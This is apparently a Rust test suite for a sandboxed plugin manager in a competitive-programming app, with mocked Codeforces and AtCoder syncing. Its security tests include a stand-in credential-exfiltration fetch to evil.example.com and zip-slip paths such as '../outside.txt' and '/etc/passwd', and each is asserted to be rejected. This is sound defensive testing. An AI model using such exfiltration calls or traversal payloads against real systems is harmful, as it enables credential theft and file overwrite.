use std::collections::BTreeMap;
use std::io::{Cursor, Write};
use std::sync::Arc;
use std::time::Duration;

use base64::Engine;

use crate::credentials::{CredentialStore, MemoryCredentialStore};
use crate::error::{PluginError, Result};
use crate::http::{HttpRequest, HttpResponse, MockHttpClient};
use crate::kv::KvStore;
use crate::manager::{
    PluginManager, PluginOrigin, RepoCatalog, RepoPluginEntry, ScaffoldKind, extract_zip_safe,
    init_plugin_scaffold, sha256_hex, test_plugin_dir,
};
use crate::manifest::{
    CommandContext, PluginCapability, PluginManifest, PluginPermissions, is_domain_allowed,
};
use crate::oj::{OjContext, OjPluginClient};
use crate::runtime::{HostContext, PluginRuntime, SandboxLimits};
use crate::workspace::{WorkspaceProblemDetail, WorkspaceProblemSummary, WorkspaceReader};

fn make_zip(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut buf = Cursor::new(Vec::new());
    {
        let mut writer = zip::ZipWriter::new(&mut buf);
        let opts = zip::write::SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);
        for (name, content) in files {
            writer.start_file(*name, opts).unwrap();
            writer.write_all(content).unwrap();
        }
        writer.finish().unwrap();
    }
    buf.into_inner()
}

fn minimal_manifest(id: &str, domains: &[&str], workspace_read: bool) -> PluginManifest {
    PluginManifest {
        id: id.to_string(),
        name: format!("Test {id}"),
        version: "0.1.0".to_string(),
        description: String::new(),
        author: None,
        homepage: None,
        entry: "index.js".to_string(),
        ui_entry: None,
        capabilities: vec![PluginCapability::OjSource],
        permissions: PluginPermissions {
            domains: domains.iter().map(|s| s.to_string()).collect(),
            workspace_read,
        },
        credentials: Vec::new(),
        tools: Vec::new(),
        commands: Vec::new(),
        importers: Vec::new(),
        exporters: Vec::new(),
    }
}

fn ok_json(body: &str) -> Result<HttpResponse> {
    Ok(HttpResponse {
        status: 200,
        headers: BTreeMap::from([("content-type".to_string(), "application/json".to_string())]),
        body: body.to_string(),
    })
}

struct MockWorkspace {
    problems: Vec<WorkspaceProblemDetail>,
}

impl WorkspaceReader for MockWorkspace {
    fn list_problems(&self) -> Result<Vec<WorkspaceProblemSummary>> {
        Ok(self
            .problems
            .iter()
            .map(|p| WorkspaceProblemSummary {
                id: p.id.clone(),
                title: p.title.clone(),
                tags: p.tags.clone(),
                difficulty: p.difficulty.clone(),
            })
            .collect())
    }

    fn get_problem(&self, id: &str) -> Result<Option<WorkspaceProblemDetail>> {
        Ok(self.problems.iter().find(|p| p.id == id).cloned())
    }
}

#[test]
fn manifest_all_capabilities_and_permission_summary() {
    let toml_src = r#"
id = "full-featured"
name = "Full Featured Plugin"
version = "1.2.3"
description = "Tests all 5 capabilities and credentials"
entry = "index.js"
ui_entry = "ui.js"
capabilities = ["oj_source", "tool", "commands", "importer", "exporter", "credentials"]

[permissions]
domains = ["api.example.com", "*.sub.example.org"]
workspace_read = true

[[credentials]]
key = "api_token"
label = "API Token"
secret = true
required = true

[[tools]]
id = "calc"
name = "Calculator"

[[tools.inputs]]
name = "expr"
label = "Expression"
kind = "string"
required = true

[[commands]]
id = "open-calc"
title = "Open Calculator"
context = "problem"

[[importers]]
id = "fps"
name = "FPS XML"
extensions = [".xml"]

[[exporters]]
id = "domjudge"
name = "DOMjudge Package"
extension = ".zip"
"#;
    let m = PluginManifest::from_toml_str(toml_src).unwrap();
    assert_eq!(m.capabilities.len(), 6);
    assert!(m.has_capability(PluginCapability::OjSource));
    assert!(m.has_capability(PluginCapability::Tool));
    assert!(m.has_capability(PluginCapability::Commands));
    assert!(m.has_capability(PluginCapability::Importer));
    assert!(m.has_capability(PluginCapability::Exporter));
    assert!(m.has_capability(PluginCapability::Credentials));
    assert_eq!(m.commands[0].context, CommandContext::Problem);

    let summary = m.permission_summary();
    assert_eq!(summary.plugin_id, "full-featured");
    assert_eq!(
        summary.domains,
        vec!["api.example.com", "*.sub.example.org"]
    );
    assert_eq!(summary.credentials, vec!["api_token"]);
    assert!(summary.workspace_read);
    assert!(summary.has_unsandboxed_ui);

    // Domain matching edge cases
    assert!(is_domain_allowed(&m.permissions.domains, "API.EXAMPLE.COM"));
    assert!(is_domain_allowed(
        &m.permissions.domains,
        "a.sub.example.org"
    ));
    assert!(!is_domain_allowed(
        &m.permissions.domains,
        "sub.example.org"
    ));
    assert!(!is_domain_allowed(
        &m.permissions.domains,
        "evil-example.com"
    ));

    // Reject path escape in entry
    let bad = r#"
id = "bad"
name = "Bad"
version = "1.0.0"
entry = "../escape.js"
"#;
    assert!(matches!(
        PluginManifest::from_toml_str(bad),
        Err(PluginError::ManifestInvalid(_))
    ));
}

#[test]
fn sandbox_enforces_timeout() {
    let manifest = minimal_manifest("looper", &[], false);
    let host_ctx = HostContext {
        manifest,
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits {
            timeout: Duration::from_millis(80),
            memory_limit_bytes: 16 * 1024 * 1024,
        },
    };
    let src = r#"
        module.exports = {
            spin() {
                while (true) {}
            }
        };
    "#;
    let err = PluginRuntime::call_function(src, "spin", &[], &host_ctx).unwrap_err();
    assert!(matches!(err, PluginError::Timeout { .. }), "got: {err:?}");
    assert_eq!(err.code(), "TIMEOUT");
}

#[test]
fn sandbox_enforces_memory_limit() {
    let manifest = minimal_manifest("oom", &[], false);
    let host_ctx = HostContext {
        manifest,
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits {
            timeout: Duration::from_secs(5),
            memory_limit_bytes: 2 * 1024 * 1024,
        },
    };
    let src = r#"
        module.exports = {
            blowUp() {
                const chunks = [];
                for (let i = 0; i < 1000; i++) {
                    chunks.push("x".repeat(1024 * 128));
                }
                return chunks.length;
            }
        };
    "#;
    let err = PluginRuntime::call_function(src, "blowUp", &[], &host_ctx).unwrap_err();
    assert!(
        matches!(err, PluginError::MemoryLimit { .. }),
        "expected MemoryLimit, got: {err:?}"
    );
    assert_eq!(err.code(), "MEMORY_LIMIT");
}

#[test]
fn sandbox_domain_whitelist_blocks_unauthorized_host_and_protects_credentials() {
    let mock_http = Arc::new(MockHttpClient::new(|req: &HttpRequest| {
        ok_json(&serde_json::json!({ "seen_auth": req.headers.get("Authorization") }).to_string())
    }));
    let creds = Arc::new(MemoryCredentialStore::new());
    creds.set("scoped", "api_key", "super-secret").unwrap();

    let manifest = minimal_manifest("scoped", &["allowed.example.com"], false);
    let host_ctx = HostContext {
        manifest,
        http_client: mock_http.clone(),
        credentials: creds.clone(),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits::default(),
    };

    let src = r#"
        module.exports = {
            callEvil() {
                return host.http.fetch({
                    url: "https://evil.example.com/steal",
                    credentialHeader: { header: "Authorization", key: "api_key", prefix: "Bearer " }
                });
            },
            callAllowed() {
                const res = host.http.fetch({
                    url: "https://allowed.example.com/data",
                    credentialHeader: { header: "Authorization", key: "api_key", prefix: "Bearer " }
                });
                return {
                    body: JSON.parse(res.body),
                    cred: host.credentials.get("api_key"),
                    hasFs: typeof fs !== "undefined",
                    hasProcess: typeof process !== "undefined",
                };
            }
        };
    "#;

    // Unauthorized domain must fail with DOMAIN_NOT_ALLOWED and never hit network
    let err = PluginRuntime::call_function(src, "callEvil", &[], &host_ctx).unwrap_err();
    assert!(
        matches!(err, PluginError::DomainNotAllowed { ref host, .. } if host == "evil.example.com"),
        "got: {err:?}"
    );
    assert_eq!(err.code(), "DOMAIN_NOT_ALLOWED");
    assert!(mock_http.recorded_requests().is_empty());

    // Whitelisted domain succeeds and receives credential header
    let ok = PluginRuntime::call_function(src, "callAllowed", &[], &host_ctx).unwrap();
    assert_eq!(ok.value["body"]["seen_auth"], "Bearer super-secret");
    assert_eq!(ok.value["cred"], "super-secret");
    assert_eq!(ok.value["hasFs"], false);
    assert_eq!(ok.value["hasProcess"], false);
}

#[test]
fn sandbox_workspace_read_gating() {
    let ws = Arc::new(MockWorkspace {
        problems: vec![WorkspaceProblemDetail {
            id: "cf-1999a".into(),
            title: "A+B Again?".into(),
            tags: vec!["math".into()],
            difficulty: Some("800".into()),
            statement_md: Some("Compute sum of digits.".into()),
            editorial_md: None,
        }],
    });
    let src = r#"
        module.exports = {
            readAll() {
                const list = host.workspace.listProblems();
                const detail = host.workspace.getProblem("cf-1999a");
                return { list, detail };
            }
        };
    "#;

    // Denied when manifest.permissions.workspace_read == false
    let denied_ctx = HostContext {
        manifest: minimal_manifest("no-ws", &[], false),
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: Some(ws.clone()),
        limits: SandboxLimits::default(),
    };
    let err = PluginRuntime::call_function(src, "readAll", &[], &denied_ctx).unwrap_err();
    assert!(
        matches!(err, PluginError::PermissionDenied { .. }),
        "got: {err:?}"
    );
    assert_eq!(err.code(), "PERMISSION_DENIED");

    // Allowed when manifest.permissions.workspace_read == true
    let allowed_ctx = HostContext {
        manifest: minimal_manifest("with-ws", &[], true),
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: Some(ws),
        limits: SandboxLimits::default(),
    };
    let ok = PluginRuntime::call_function(src, "readAll", &[], &allowed_ctx).unwrap();
    assert_eq!(ok.value["list"].as_array().unwrap().len(), 1);
    assert_eq!(ok.value["detail"]["title"], "A+B Again?");
}

#[test]
fn host_kv_render_html_log_and_async_promise() {
    let dir = tempfile::tempdir().unwrap();
    let kv = Arc::new(KvStore::open(dir.path(), "demo").unwrap());
    let host_ctx = HostContext {
        manifest: minimal_manifest("demo", &[], false),
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: kv.clone(),
        workspace: None,
        limits: SandboxLimits::default(),
    };

    let src = r##"
        module.exports = {
            async run() {
                host.log("info", "starting");
                host.kv.set("cursor", 42);
                const c = host.kv.get("cursor");
                const nodes = host.html.select("<div><a href='/p/1'>Hello</a></div>", "a");
                const pngB64 = host.render.svgToPng(
                    '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16"><rect width="16" height="16" fill="#000"/></svg>',
                    1
                );
                return { cursor: c, linkText: nodes[0].text, linkHref: nodes[0].attrs.href, pngB64 };
            }
        };
    "##;

    let res = PluginRuntime::call_function(src, "run", &[], &host_ctx).unwrap();
    assert_eq!(res.value["cursor"], 42);
    assert_eq!(res.value["linkText"], "Hello");
    assert_eq!(res.value["linkHref"], "/p/1");
    assert_eq!(res.logs.len(), 1);
    assert_eq!(res.logs[0].level, "info");
    assert_eq!(res.logs[0].message, "starting");

    let png_bytes = base64::engine::general_purpose::STANDARD
        .decode(res.value["pngB64"].as_str().unwrap())
        .unwrap();
    assert_eq!(&png_bytes[..8], b"\x89PNG\r\n\x1a\n");

    // Verify atomic persistence on disk
    let reopened = KvStore::open(dir.path(), "demo").unwrap();
    assert_eq!(reopened.get("cursor").unwrap(), Some(serde_json::json!(42)));
}

#[test]
fn zip_slip_attack_is_rejected() {
    let tmp = tempfile::tempdir().unwrap();
    let malicious_zip = make_zip(&[("../outside.txt", b"pwned")]);
    let err = extract_zip_safe(&malicious_zip, tmp.path()).unwrap_err();
    assert!(matches!(err, PluginError::ZipSlip(_)), "got: {err:?}");
    assert_eq!(err.code(), "ZIP_SLIP");

    let abs_zip = make_zip(&[("/etc/passwd", b"nope")]);
    let err2 = extract_zip_safe(&abs_zip, tmp.path()).unwrap_err();
    assert!(matches!(err2, PluginError::ZipSlip(_)), "got: {err2:?}");

    let backslash_zip = make_zip(&[(r"..\..\evil.js", b"nope")]);
    let err3 = extract_zip_safe(&backslash_zip, tmp.path()).unwrap_err();
    assert!(matches!(err3, PluginError::ZipSlip(_)), "got: {err3:?}");
}

#[test]
fn builtin_codeforces_end_to_end() {
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());
    let loaded = mgr.load_plugin("codeforces").unwrap();
    assert_eq!(loaded.info.origin, PluginOrigin::Builtin);

    let mock_http = Arc::new(MockHttpClient::new(|req: &HttpRequest| {
        if req.url.contains("/api/user.info") {
            ok_json(
                r#"{
                    "status": "OK",
                    "result": [{
                        "handle": "tourist",
                        "rating": 3800,
                        "maxRating": 4009,
                        "rank": "legendary grandmaster"
                    }]
                }"#,
            )
        } else if req.url.contains("/api/user.rating") {
            ok_json(
                r#"{
                    "status": "OK",
                    "result": [{
                        "contestId": 1999,
                        "contestName": "Codeforces Round 964 (Div. 4)",
                        "rank": 1,
                        "oldRating": 3750,
                        "newRating": 3800,
                        "ratingUpdateTimeSeconds": 1722960000
                    }]
                }"#,
            )
        } else if req.url.contains("/api/user.status") {
            ok_json(
                r#"{
                    "status": "OK",
                    "result": [
                        {
                            "id": 2002,
                            "creationTimeSeconds": 1722961200,
                            "programmingLanguage": "C++20 (GCC 13-64)",
                            "verdict": "OK",
                            "problem": {
                                "contestId": 1999,
                                "index": "A",
                                "name": "A+B Again?",
                                "rating": 800,
                                "tags": ["implementation", "math"]
                            }
                        },
                        {
                            "id": 2001,
                            "creationTimeSeconds": 1722961000,
                            "programmingLanguage": "C++20 (GCC 13-64)",
                            "verdict": "WRONG_ANSWER",
                            "problem": {
                                "contestId": 1999,
                                "index": "B",
                                "name": "Card Game",
                                "rating": 1000,
                                "tags": ["games"]
                            }
                        }
                    ]
                }"#,
            )
        } else if req.url.contains("/api/contest.list") {
            ok_json(
                r#"{
                    "status": "OK",
                    "result": [
                        {
                            "id": 2050,
                            "name": "Codeforces Round 990",
                            "type": "CF",
                            "phase": "BEFORE",
                            "durationSeconds": 7200,
                            "startTimeSeconds": 1735000000
                        },
                        {
                            "id": 1900,
                            "name": "Old Round",
                            "type": "CF",
                            "phase": "FINISHED",
                            "durationSeconds": 7200,
                            "startTimeSeconds": 1700000000
                        }
                    ]
                }"#,
            )
        } else {
            panic!("unexpected url: {}", req.url);
        }
    }));

    let host_ctx = HostContext {
        manifest: loaded.info.manifest.clone(),
        http_client: mock_http,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits::default(),
    };
    let client = OjPluginClient::new(&loaded.entry_source, &host_ctx);
    let oj_ctx = OjContext {
        handle: "tourist".into(),
    };

    let v = client.verify(&oj_ctx).unwrap();
    assert!(v.ok);
    assert_eq!(v.handle.as_deref(), Some("tourist"));

    let acct = client.sync_account(&oj_ctx).unwrap();
    assert_eq!(acct.rating, Some(3800));
    assert_eq!(acct.max_rating, Some(4009));
    assert_eq!(acct.rating_history.len(), 1);
    assert_eq!(acct.rating_history[0].contest_id, "1999");

    // Initial submission sync
    let batch1 = client.sync_submissions(&oj_ctx, None).unwrap();
    assert_eq!(batch1.submissions.len(), 2);
    assert_eq!(batch1.submissions[0].verdict, "AC");
    assert_eq!(batch1.submissions[0].problem_key, "1999A");
    assert_eq!(batch1.submissions[1].verdict, "WA");
    assert_eq!(batch1.next_cursor.as_deref(), Some("2002"));

    // Incremental sync with cursor "2001" only returns submission 2002
    let batch2 = client.sync_submissions(&oj_ctx, Some("2001")).unwrap();
    assert_eq!(batch2.submissions.len(), 1);
    assert_eq!(batch2.submissions[0].submission_id, "2002");

    let contests = client.fetch_contests(&oj_ctx).unwrap();
    assert_eq!(contests.len(), 1);
    assert_eq!(contests[0].contest_id, "2050");

    assert_eq!(client.normalize_rating(1650.0).unwrap(), Some(1650));

    let p1 = client
        .parse_problem_url("https://codeforces.com/problemset/problem/1999/A")
        .unwrap()
        .unwrap();
    assert_eq!(p1.problem_id, "1999A");
    let p2 = client
        .parse_problem_url("https://codeforces.com/contest/1999/problem/B")
        .unwrap()
        .unwrap();
    assert_eq!(p2.problem_id, "1999B");
    let p3 = client
        .parse_problem_url("https://codeforces.com/gym/100001/problem/C")
        .unwrap()
        .unwrap();
    assert_eq!(p3.problem_id, "100001C");
    assert!(
        client
            .parse_problem_url("https://atcoder.jp/contests/abc350/tasks/abc350_a")
            .unwrap()
            .is_none()
    );
}

#[test]
fn builtin_atcoder_end_to_end() {
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());
    let loaded = mgr.load_plugin("atcoder").unwrap();
    assert_eq!(loaded.info.origin, PluginOrigin::Builtin);

    let mock_http = Arc::new(MockHttpClient::new(|req: &HttpRequest| {
        if req.url.contains("atcoder.jp/users/chokudai/history/json") {
            ok_json(
                r#"[
                    {
                        "IsRated": true,
                        "Place": 10,
                        "OldRating": 2700,
                        "NewRating": 2850,
                        "ContestName": "AtCoder Beginner Contest 350",
                        "ContestScreenName": "abc350.contest.atcoder.jp",
                        "EndTime": "2024-04-20T22:40:00+09:00",
                        "ContestType": 0
                    },
                    {
                        "IsRated": true,
                        "Place": 1,
                        "OldRating": 2000,
                        "NewRating": 2200,
                        "ContestName": "AtCoder Heuristic Contest 032",
                        "ContestScreenName": "ahc032.contest.atcoder.jp",
                        "EndTime": "2024-04-21T22:40:00+09:00",
                        "ContestType": 1
                    }
                ]"#,
            )
        } else if req
            .url
            .contains("kenkoooo.com/atcoder/atcoder-api/v3/user/submissions")
        {
            ok_json(
                r#"[
                    {
                        "id": 50001,
                        "epoch_second": 1713615000,
                        "problem_id": "abc350_d",
                        "contest_id": "abc350",
                        "user_id": "chokudai",
                        "language": "C++ 20 (gcc 12.2)",
                        "result": "AC"
                    }
                ]"#,
            )
        } else if req
            .url
            .contains("kenkoooo.com/atcoder/resources/problems.json")
        {
            ok_json(
                r#"[
                    {
                        "id": "abc350_d",
                        "contest_id": "abc350",
                        "problem_index": "D",
                        "name": "New Friends",
                        "title": "D. New Friends"
                    }
                ]"#,
            )
        } else if req
            .url
            .contains("kenkoooo.com/atcoder/resources/problem-models.json")
        {
            ok_json(r#"{ "abc350_d": { "difficulty": 1200 } }"#)
        } else if req.url == "https://atcoder.jp/contests/" {
            Ok(HttpResponse {
                status: 200,
                headers: BTreeMap::new(),
                body: r##"
                    <html><body>
                      <div id="contest-table-upcoming">
                        <table><tbody>
                          <tr>
                            <td><a href="#">2026-12-01 21:00:00+0900</a></td>
                            <td><a href="/contests/abc400">AtCoder Beginner Contest 400</a></td>
                            <td>01:40</td>
                          </tr>
                        </tbody></table>
                      </div>
                    </body></html>
                "##
                .to_string(),
            })
        } else {
            panic!("unexpected url: {}", req.url);
        }
    }));

    let host_ctx = HostContext {
        manifest: loaded.info.manifest.clone(),
        http_client: mock_http,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits::default(),
    };
    let client = OjPluginClient::new(&loaded.entry_source, &host_ctx);
    let oj_ctx = OjContext {
        handle: "chokudai".into(),
    };

    assert!(client.verify(&oj_ctx).unwrap().ok);

    // Heuristic contest (ContestType == 1 / ahc032) must be excluded!
    let acct = client.sync_account(&oj_ctx).unwrap();
    assert_eq!(acct.rating, Some(2850));
    assert_eq!(acct.max_rating, Some(2850));
    assert_eq!(acct.rank.as_deref(), Some("red"));
    assert_eq!(acct.rating_history.len(), 1);
    assert_eq!(acct.rating_history[0].contest_id, "abc350");

    let batch = client.sync_submissions(&oj_ctx, None).unwrap();
    assert_eq!(batch.submissions.len(), 1);
    assert_eq!(batch.submissions[0].problem_key, "abc350_d");
    assert_eq!(batch.submissions[0].problem_title, "D. New Friends");
    assert_eq!(batch.submissions[0].raw_rating, Some(1200.0));
    assert_eq!(batch.submissions[0].normalized_rating, Some(1760));
    assert_eq!(batch.next_cursor.as_deref(), Some("1713615000"));

    let contests = client.fetch_contests(&oj_ctx).unwrap();
    assert_eq!(contests.len(), 1);
    assert_eq!(contests[0].contest_id, "abc400");
    assert_eq!(contests[0].duration_sec, 6000);

    let r_low = client.normalize_rating(0.0).unwrap().unwrap();
    let r_mid = client.normalize_rating(1200.0).unwrap().unwrap();
    let r_high = client.normalize_rating(2400.0).unwrap().unwrap();
    assert!(r_low < r_mid && r_mid < r_high);

    let parsed = client
        .parse_problem_url("https://atcoder.jp/contests/abc350/tasks/abc350_d")
        .unwrap()
        .unwrap();
    assert_eq!(parsed.platform, "atcoder");
    assert_eq!(parsed.contest_id.as_deref(), Some("abc350"));
    assert_eq!(parsed.problem_id, "abc350_d");
    assert_eq!(parsed.problem_index.as_deref(), Some("D"));
}

#[test]
fn lightweight_oj_plugin_sync_summary() {
    let manifest = minimal_manifest("luogu-lite", &["www.luogu.com.cn"], false);
    let mock_http = Arc::new(MockHttpClient::new(|_req| {
        ok_json(r#"{ "passed": 321, "submitted": 654, "problems": ["P1001", "P1002"] }"#)
    }));
    let host_ctx = HostContext {
        manifest,
        http_client: mock_http,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits::default(),
    };
    let src = r#"
        module.exports = {
            syncSummary(ctx) {
                const r = host.http.fetch({ url: "https://www.luogu.com.cn/user/" + ctx.handle });
                const d = JSON.parse(r.body);
                return {
                    handle: ctx.handle,
                    solved_count: d.passed,
                    submission_count: d.submitted,
                    solved_problem_keys: d.problems,
                };
            }
        };
    "#;
    let client = OjPluginClient::new(src, &host_ctx);
    let summary = client
        .sync_summary(&OjContext {
            handle: "12345".into(),
        })
        .unwrap();
    assert_eq!(summary.solved_count, 321);
    assert_eq!(summary.submission_count, Some(654));
    assert_eq!(summary.solved_problem_keys, vec!["P1001", "P1002"]);
}

#[test]
fn manager_builtin_override_state_and_repo_sha256() {
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());

    // Export built-in copy -> becomes LocalOverride
    let exported = mgr.export_builtin_copy("codeforces").unwrap();
    assert!(exported.join("manifest.toml").is_file());
    let list = mgr.list_plugins().unwrap();
    let cf = list.iter().find(|p| p.manifest.id == "codeforces").unwrap();
    assert_eq!(cf.origin, PluginOrigin::LocalOverride);

    // Disable & record error persist across reads
    mgr.set_enabled("codeforces", false).unwrap();
    mgr.record_error("codeforces", "rate limited").unwrap();
    let cf2 = mgr
        .list_plugins()
        .unwrap()
        .into_iter()
        .find(|p| p.manifest.id == "codeforces")
        .unwrap();
    assert!(!cf2.enabled);
    assert_eq!(cf2.last_error.as_deref(), Some("rate limited"));
    mgr.clear_error("codeforces").unwrap();

    // Build a valid community plugin ZIP inside a top-level folder
    let community_zip = make_zip(&[
        (
            "vjudge-plugin/manifest.toml",
            br#"
id = "vjudge"
name = "VJudge"
version = "0.2.0"
entry = "index.js"
capabilities = ["oj_source"]
"#,
        ),
        (
            "vjudge-plugin/index.js",
            b"module.exports = { verify(ctx) { return { ok: true, handle: ctx.handle }; } };",
        ),
    ]);
    let good_sha = sha256_hex(&community_zip);
    let catalog = RepoCatalog {
        name: "Community Repo".into(),
        plugins: vec![RepoPluginEntry {
            id: "vjudge".into(),
            name: "VJudge".into(),
            version: "0.2.0".into(),
            description: "VJudge plugin".into(),
            download_url: "https://repo.example.com/vjudge.zip".into(),
            sha256: good_sha.clone(),
            permissions: None,
        }],
    };
    let catalog_json = serde_json::to_string(&catalog).unwrap();
    let zip_clone = community_zip.clone();
    let mock_http = MockHttpClient::new(move |req| {
        if req.url == "https://repo.example.com/index.json" {
            ok_json(&catalog_json)
        } else {
            panic!("unexpected url {}", req.url);
        }
    })
    .with_bytes_handler(move |url| {
        if url == "https://repo.example.com/vjudge.zip" {
            Ok(zip_clone.clone())
        } else {
            panic!("unexpected download url {url}");
        }
    });

    mgr.add_repo(
        "https://repo.example.com/index.json",
        Some("Community".into()),
    )
    .unwrap();
    assert_eq!(mgr.list_repos().unwrap().len(), 1);

    let fetched = mgr
        .fetch_repo_catalog("https://repo.example.com/index.json", &mock_http)
        .unwrap();
    assert_eq!(fetched.plugins.len(), 1);

    // Mismatched SHA-256 must be rejected
    let mut bad_entry = fetched.plugins[0].clone();
    bad_entry.sha256 = "0".repeat(64);
    let err = mgr
        .install_from_repo_entry(&bad_entry, &mock_http)
        .unwrap_err();
    assert!(
        matches!(err, PluginError::ChecksumMismatch { .. }),
        "got: {err:?}"
    );
    assert_eq!(err.code(), "CHECKSUM_MISMATCH");

    // Matching SHA-256 installs cleanly
    let installed = mgr
        .install_from_repo_entry(&fetched.plugins[0], &mock_http)
        .unwrap();
    assert_eq!(installed.manifest.id, "vjudge");
    assert_eq!(installed.origin, PluginOrigin::Local);

    assert!(
        mgr.remove_repo("https://repo.example.com/index.json")
            .unwrap()
    );
    assert!(mgr.list_repos().unwrap().is_empty());
}

#[test]
fn scaffold_and_test_plugin_dir() {
    let tmp = tempfile::tempdir().unwrap();
    let tool_dir = tmp.path().join("my-tool");
    init_plugin_scaffold(&tool_dir, ScaffoldKind::Tool).unwrap();
    assert!(tool_dir.join("manifest.toml").is_file());
    assert!(tool_dir.join("index.js").is_file());
    assert!(tool_dir.join("xcpc-plugin.d.ts").is_file());

    let report = test_plugin_dir(
        &tool_dir,
        "runTool",
        r#"["hello", { "text": "XCPC" }]"#,
        Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        Arc::new(MemoryCredentialStore::new()),
        None,
    )
    .unwrap();
    assert_eq!(report.plugin_id, "my-tool");
    assert_eq!(report.action, "runTool");
    assert_eq!(report.result["blocks"][0]["content"], "Hello, XCPC!");

    let oj_dir = tmp.path().join("my-oj");
    init_plugin_scaffold(&oj_dir, ScaffoldKind::Oj).unwrap();
    let oj_report = test_plugin_dir(
        &oj_dir,
        "verify",
        r#"[{ "handle": "alice" }]"#,
        Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        Arc::new(MemoryCredentialStore::new()),
        None,
    )
    .unwrap();
    assert_eq!(oj_report.result["ok"], true);
    assert_eq!(oj_report.result["handle"], "alice");
}

#[test]
fn render_svg_to_rgba_and_highlight_code_primitives() {
    use crate::render::{highlight_code, svg_to_rgba};

    let svg = r##"<svg xmlns="http://www.w3.org/2000/svg" width="24" height="12"><rect width="24" height="12" fill="#2563eb"/></svg>"##;
    let rgba = svg_to_rgba(svg, 2.0).unwrap();
    assert_eq!(rgba.width, 48);
    assert_eq!(rgba.height, 24);
    let raw = base64::engine::general_purpose::STANDARD
        .decode(&rgba.rgba_base64)
        .unwrap();
    assert_eq!(raw.len(), (48 * 24 * 4) as usize);

    // Highlight C++ code and verify token kinds & lossless text reconstruction
    let cpp = "#include <iostream>\nint main() {\n  // hello\n  const int x = 42;\n  return x;\n}";
    let hl = highlight_code(cpp, "cpp");
    assert_eq!(hl.language, "cpp");
    assert_eq!(hl.lines.len(), 6);
    for (orig, line) in cpp.lines().zip(&hl.lines) {
        let joined: String = line.tokens.iter().map(|t| t.text.as_str()).collect();
        assert_eq!(joined, orig);
    }
    assert!(
        hl.lines[0]
            .tokens
            .iter()
            .any(|t| t.kind == "keyword" && t.text == "#include")
    );
    assert!(
        hl.lines[1]
            .tokens
            .iter()
            .any(|t| t.kind == "type" && t.text == "int")
    );
    assert!(hl.lines[2].tokens.iter().any(|t| t.kind == "comment"));
    assert!(
        hl.lines[3]
            .tokens
            .iter()
            .any(|t| t.kind == "number" && t.text == "42")
    );

    // Verify QuickJS bridge exposes host.render.svgToRgba & host.highlight
    let host_ctx = HostContext {
        manifest: minimal_manifest("hl-test", &[], false),
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits::default(),
    };
    let src = r##"
        module.exports = {
            check() {
                const rgba = host.render.svgToRgba(
                    '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="#10b981"/></svg>',
                    1
                );
                const hl = host.highlight('fn main() { let s = "hi"; }', "rust");
                return { width: rgba.width, height: rgba.height, hasB64: rgba.rgba_base64.length > 0, lang: hl.language, tokens: hl.lines[0].tokens };
            }
        };
    "##;
    let call = PluginRuntime::call_function(src, "check", &[], &host_ctx).unwrap();
    assert_eq!(call.value["width"], 10);
    assert_eq!(call.value["height"], 10);
    assert_eq!(call.value["hasB64"], true);
    assert_eq!(call.value["lang"], "rust");
    let tokens = call.value["tokens"].as_array().unwrap();
    assert!(
        tokens
            .iter()
            .any(|t| t["kind"] == "keyword" && t["text"] == "fn")
    );
    assert!(
        tokens
            .iter()
            .any(|t| t["kind"] == "string" && t["text"] == "\"hi\"")
    );
}

#[test]
fn builtin_four_tool_plugins_and_export_copy_with_ui_js() {
    use crate::commands::PluginCommandAction;
    use crate::tool::ToolOutputBlock;

    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());

    // 1. list_tools should include all 4 built-in tool plugins
    let tools = mgr.list_tools();
    let ids: Vec<&str> = tools.iter().map(|t| t.plugin_id.as_str()).collect();
    assert!(ids.contains(&"graph-editor"), "got: {ids:?}");
    assert!(ids.contains(&"math-bitwise"), "got: {ids:?}");
    assert!(ids.contains(&"complexity-mem"), "got: {ids:?}");
    assert!(ids.contains(&"string-lab"), "got: {ids:?}");

    let graph_group = tools
        .iter()
        .find(|t| t.plugin_id == "graph-editor")
        .unwrap();
    assert!(graph_group.has_ui);
    assert_eq!(graph_group.ui_entry.as_deref(), Some("ui.js"));
    assert!(graph_group.is_builtin);

    // read_ui_source works for built-ins with ui.js and returns None for headless plugins
    let graph_ui = mgr.read_ui_source("graph-editor").unwrap().unwrap();
    assert!(graph_ui.contains("module.exports = { render }"));
    let math_ui = mgr.read_ui_source("math-bitwise").unwrap().unwrap();
